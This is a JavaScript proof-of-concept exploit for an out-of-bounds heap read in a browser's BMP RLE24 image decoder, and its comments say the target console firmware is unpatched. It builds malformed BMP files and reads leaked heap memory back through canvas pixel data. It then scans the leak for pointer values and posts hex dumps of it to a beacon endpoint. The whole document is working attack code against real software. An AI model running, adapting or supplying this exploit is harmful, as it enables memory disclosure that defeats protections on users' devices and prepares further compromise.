// p402 - BMP RLE24 OOB read info leak
//
// Bug: BMPImageReader::readCurrentPixel (BMPImageReader.h:195-207)
// uses m_coord.x() * bytesPerPixel as offset from m_decodedOffset.
// In RLE absolute mode after delta, m_decodedOffset = absolute run start
// but m_coord.x() is absolute position (set by delta).
// Result: reads (m_coord.x() * 3) bytes from start of absolute data.
// For large X this goes past the file buffer into heap memory.
//
// CRITICAL: This only works with 16/24/32bpp data (readCurrentPixel path).
// 8bpp (RLE8) uses sequential byte indexing -- not affected.
// RLE24 (OS/2 2.x, biCompression=4, biBitCount=24) hits readCurrentPixel.
//
// Fixed in WK-1400: (m_coord.x() - startX) * bytesPerPixel
// PS5 WK-1200: UNPATCHED
//
// Canvas getImageData() reads leaked heap bytes as RGB pixel values.
//
// Beacon prefix: V402-

(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V402-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {}
  }
  function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT');

  try {
    // RLE24 BMP: OS/2 2.x, biCompression=4, biBitCount=24
    // Width=256, Height=2, no palette
    var W = 256, H = 2;
    var HDR = 14 + 40; // 54 bytes, no palette for 24bpp

    // Build RLE24 pixel data
    var rle = [];

    // Row 0 (bottom, canvas y=1): fill 256 pixels black using encoded mode
    // RLE24 encoded: [count, B, G, R] = 4 bytes per run
    rle.push(255, 0x00, 0x00, 0x00); // 255 black pixels
    rle.push(1, 0x00, 0x00, 0x00);   // 1 more black pixel = 256 total
    rle.push(0x00, 0x00);             // EOL

    // Row 1 (top, canvas y=0): delta then absolute mode
    var DX = 200;
    rle.push(0x00, 0x02, DX, 0x00);  // delta: move X by DX

    // Absolute mode: fill remaining (W - DX) = 56 pixels
    // In processNonRLEData, each pixel is 3 bytes (24bpp)
    // readCurrentPixel uses m_coord.x() * 3 as offset from m_decodedOffset
    // First pixel at x=200 reads at offset 200*3 = 600
    // But absolute data is only 56*3 = 168 bytes
    // Read goes 432 bytes past into heap
    var count = W - DX; // 56
    rle.push(0x00, count); // absolute mode escape: 0x00, count

    // Absolute data: 56 * 3 = 168 bytes of RGB triplets
    // Fill with known pattern 0xCC for identification
    for (var i = 0; i < count * 3; i++) {
      rle.push(0xCC);
    }
    // RLE absolute pads to 16-bit boundary: 168 bytes = even, no pad needed

    rle.push(0x00, 0x00); // EOL
    rle.push(0x00, 0x01); // EOB

    var fSize = HDR + rle.length;
    B('FILE-' + fSize + '-DX-' + DX + '-CNT-' + count + '-ABS3-' + (count * 3));

    // Build BMP file
    var bmp = new Uint8Array(fSize);
    var p = 0;

    // -- File Header (14 bytes) --
    bmp[p++] = 0x42; bmp[p++] = 0x4D; // BM magic
    bmp[p++] = fSize & 0xFF; bmp[p++] = (fSize >> 8) & 0xFF;
    bmp[p++] = (fSize >> 16) & 0xFF; bmp[p++] = (fSize >> 24) & 0xFF;
    p += 4; // reserved
    // Data offset = HDR = 54
    bmp[p++] = HDR & 0xFF; bmp[p++] = (HDR >> 8) & 0xFF;
    bmp[p++] = (HDR >> 16) & 0xFF; bmp[p++] = (HDR >> 24) & 0xFF;

    // -- Info Header (40 bytes) --
    bmp[p++] = 40; p += 3; // biSize = 40
    // biWidth = 256
    bmp[p++] = W & 0xFF; bmp[p++] = (W >> 8) & 0xFF; p += 2;
    // biHeight = 2 (positive = bottom-up, required for RLE)
    bmp[p++] = H & 0xFF; bmp[p++] = (H >> 8) & 0xFF; p += 2;
    // biPlanes = 1
    bmp[p++] = 1; bmp[p++] = 0;
    // biBitCount = 24
    bmp[p++] = 24; bmp[p++] = 0;
    // biCompression = 4 (triggers OS/2 2.x RLE24 detection)
    bmp[p++] = 4; p += 3;
    // biSizeImage = 0
    p += 4;
    // biXPelsPerMeter, biYPelsPerMeter
    p += 8;
    // biClrUsed = 0 (no palette for 24bpp)
    p += 4;
    // biClrImportant = 0
    p += 4;

    // -- RLE24 pixel data --
    for (var i = 0; i < rle.length; i++) bmp[p++] = rle[i];

    B('BUILT-' + p + '-vs-' + fSize);

    // Load image via blob URL
    var blob = new Blob([bmp], { type: 'image/bmp' });
    var url = URL.createObjectURL(blob);
    var img = new Image();

    img.onload = function() {
      B('LOADED-' + img.width + 'x' + img.height);

      var canvas = document.createElement('canvas');
      canvas.width = W;
      canvas.height = H;
      var ctx = canvas.getContext('2d');
      ctx.drawImage(img, 0, 0);

      // Read top row (file row 1 = canvas y=0)
      var d = ctx.getImageData(0, 0, W, 1).data;

      // Pixels 0..DX-1 should be black (delta skipped them)
      // Pixels DX..W-1 should contain OOB data (or 0xCC if no OOB)
      var ccCount = 0, oobCount = 0, zeroCount = 0;
      var bytes = [];
      for (var x = DX; x < W; x++) {
        var r = d[x * 4];
        var g = d[x * 4 + 1];
        var b = d[x * 4 + 2];
        bytes.push(r, g, b);
        if (r === 0xCC && g === 0xCC && b === 0xCC) ccCount++;
        else if (r === 0 && g === 0 && b === 0) zeroCount++;
        else oobCount++;
      }

      B('STAT-CC' + ccCount + '-OOB' + oobCount + '-Z' + zeroCount);

      // Hex dump in 48-byte chunks (16 pixels * 3 channels)
      for (var c = 0; c < bytes.length && c < 336; c += 48) {
        var h = '';
        for (var j = c; j < c + 48 && j < bytes.length; j++) h += hx(bytes[j]);
        B('D' + c + '-' + h);
      }

      // Look for pointer patterns in the leaked bytes
      // 8-byte window with 6+ non-trivial bytes
      var ptrs = [];
      for (var i = 0; i < bytes.length - 7; i++) {
        var nz = 0;
        for (var b = 0; b < 8; b++) {
          var v = bytes[i + b];
          if (v !== 0 && v !== 0xCC) nz++;
        }
        if (nz >= 6) {
          var ph = '';
          for (var b = 0; b < 8; b++) ph += hx(bytes[i + b]);
          ptrs.push('O' + i + ':' + ph);
          i += 7;
        }
      }
      B('PTRS-' + ptrs.length);
      for (var pi = 0; pi < ptrs.length && pi < 10; pi++) {
        B('P' + pi + '-' + ptrs[pi]);
      }

      // Control: bottom row (y=1) should be all black
      var r1 = ctx.getImageData(0, 1, W, 1).data;
      var ctlNz = 0;
      for (var x = 0; x < W; x++) {
        if (r1[x*4] !== 0 || r1[x*4+1] !== 0 || r1[x*4+2] !== 0) ctlNz++;
      }
      B('CTL-NZ-' + ctlNz);

      // Run variant with bigger delta for wider OOB
      setTimeout(function() { runVariant2(); }, 300);
    };

    img.onerror = function() {
      B('IMG-ERR');
      // Try variant with standard Windows header (biCompression=0, uncompressed 24bpp)
      // as diagnostic: does 24bpp BMP work at all?
      setTimeout(function() { testUncompressed24(); }, 300);
    };

    img.src = url;

    function runVariant2() {
      try {
        // Variant 2: Width=512, DX=400, count=112
        // OOB: reads at 400*3=1200, data is 336 bytes
        // 864 bytes into heap
        var W2 = 512, DX2 = 400, CNT2 = W2 - DX2; // 112

        var rle2 = [];
        // Row 0: 512 black pixels
        for (var r = 0; r < 2; r++) rle2.push(255, 0x00, 0x00, 0x00);
        rle2.push(2, 0x00, 0x00, 0x00); // 2 more = 512
        rle2.push(0x00, 0x00); // EOL

        // Row 1: delta then absolute
        // Delta > 255: need multiple delta commands
        var rem = DX2;
        while (rem > 0) {
          var step = rem > 255 ? 255 : rem;
          rle2.push(0x00, 0x02, step, 0x00);
          rem -= step;
        }
        rle2.push(0x00, CNT2); // absolute mode
        for (var i = 0; i < CNT2 * 3; i++) rle2.push(0xDD);
        // Pad to 16-bit if needed
        if ((CNT2 * 3) % 2 !== 0) rle2.push(0x00);
        rle2.push(0x00, 0x00); // EOL
        rle2.push(0x00, 0x01); // EOB

        var fs2 = HDR + rle2.length;
        var bmp2 = new Uint8Array(fs2);
        var q = 0;

        // File header
        bmp2[q++] = 0x42; bmp2[q++] = 0x4D;
        bmp2[q++] = fs2 & 0xFF; bmp2[q++] = (fs2 >> 8) & 0xFF;
        bmp2[q++] = (fs2 >> 16) & 0xFF; bmp2[q++] = (fs2 >> 24) & 0xFF;
        q += 4;
        bmp2[q++] = HDR & 0xFF; bmp2[q++] = (HDR >> 8) & 0xFF;
        bmp2[q++] = (HDR >> 16) & 0xFF; bmp2[q++] = (HDR >> 24) & 0xFF;

        // Info header
        bmp2[q++] = 40; q += 3;
        bmp2[q++] = W2 & 0xFF; bmp2[q++] = (W2 >> 8) & 0xFF; q += 2;
        bmp2[q++] = 2; q += 3; // height=2
        bmp2[q++] = 1; bmp2[q++] = 0; // planes
        bmp2[q++] = 24; bmp2[q++] = 0; // 24bpp
        bmp2[q++] = 4; q += 3; // biCompression=4 (RLE24)
        q += 20; // rest of header zeros

        for (var i = 0; i < rle2.length; i++) bmp2[q++] = rle2[i];

        var blob2 = new Blob([bmp2], { type: 'image/bmp' });
        var url2 = URL.createObjectURL(blob2);
        var img2 = new Image();

        img2.onload = function() {
          B('V2-LOADED-' + img2.width + 'x' + img2.height);
          var c2 = document.createElement('canvas');
          c2.width = W2; c2.height = 2;
          var cx2 = c2.getContext('2d');
          cx2.drawImage(img2, 0, 0);
          var d2 = cx2.getImageData(0, 0, W2, 1).data;

          var dd = 0, oob2 = 0, z2 = 0;
          var sample = '';
          for (var x = DX2; x < W2; x++) {
            var r = d2[x*4], g = d2[x*4+1], b = d2[x*4+2];
            if (r === 0xDD && g === 0xDD && b === 0xDD) dd++;
            else if (r === 0 && g === 0 && b === 0) z2++;
            else oob2++;
            if (sample.length < 96) sample += hx(r) + hx(g) + hx(b);
          }
          B('V2-STAT-DD' + dd + '-OOB' + oob2 + '-Z' + z2);
          B('V2-SAMPLE-' + sample);
          B('COMPLETE');
        };
        img2.onerror = function() {
          B('V2-ERR');
          B('COMPLETE');
        };
        img2.src = url2;
      } catch(e) {
        B('V2-EX-' + e.message.substring(0, 60));
        B('COMPLETE');
      }
    }

    function testUncompressed24() {
      try {
        // Diagnostic: basic uncompressed 24bpp BMP (biCompression=0)
        var tw = 4, th = 4;
        var rowBytes = tw * 3;
        var padRow = (rowBytes + 3) & ~3; // 12, already aligned
        var tSize = HDR + padRow * th;
        var tbmp = new Uint8Array(tSize);
        var q = 0;
        tbmp[q++] = 0x42; tbmp[q++] = 0x4D;
        tbmp[q++] = tSize & 0xFF; tbmp[q++] = (tSize >> 8) & 0xFF;
        tbmp[q++] = (tSize >> 16) & 0xFF; tbmp[q++] = (tSize >> 24) & 0xFF;
        q += 4;
        tbmp[q++] = HDR & 0xFF; tbmp[q++] = (HDR >> 8) & 0xFF;
        tbmp[q++] = (HDR >> 16) & 0xFF; tbmp[q++] = (HDR >> 24) & 0xFF;
        tbmp[q++] = 40; q += 3;
        tbmp[q++] = tw; q += 3;
        tbmp[q++] = th; q += 3;
        tbmp[q++] = 1; tbmp[q++] = 0;
        tbmp[q++] = 24; tbmp[q++] = 0;
        q += 24; // biCompression=0 (RGB), rest zeros
        // Pixel data: each row BGR
        for (var row = 0; row < th; row++) {
          for (var col = 0; col < tw; col++) {
            tbmp[q++] = row * 60;  // B
            tbmp[q++] = col * 60;  // G
            tbmp[q++] = 0xFF;      // R
          }
        }

        var tblob = new Blob([tbmp], { type: 'image/bmp' });
        var turl = URL.createObjectURL(tblob);
        var timg = new Image();
        timg.onload = function() {
          B('DIAG-24BPP-OK-' + timg.width + 'x' + timg.height);
          B('COMPLETE');
        };
        timg.onerror = function() {
          B('DIAG-24BPP-ERR');
          B('COMPLETE');
        };
        timg.src = turl;
      } catch(e) {
        B('DIAG-EX-' + e.message.substring(0, 60));
        B('COMPLETE');
      }
    }

  } catch(e) {
    B('ERR-' + e.message.substring(0, 80));
  }
})();
